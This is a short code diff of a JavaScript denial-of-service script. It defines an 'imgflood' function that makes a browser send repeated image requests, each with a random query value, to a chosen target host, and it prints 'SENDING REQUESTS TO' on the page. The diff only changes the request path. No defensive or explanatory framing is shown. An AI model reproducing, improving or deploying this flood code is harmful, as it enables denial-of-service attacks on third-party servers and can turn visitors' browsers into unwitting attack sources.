@@ -12,7 +12,7 @@ text = document.write("SENDING REQUESTS TO : " + x);
 
 function imgflood() { 
 var TARGET = x
-var URI = '/index.php?'
+var URI = '/index.php'
 var pic = new Image()
 var rand = Math.floor(Math.random() * 1000)
 pic.src = 'http://'+TARGET+URI+rand+'=val'
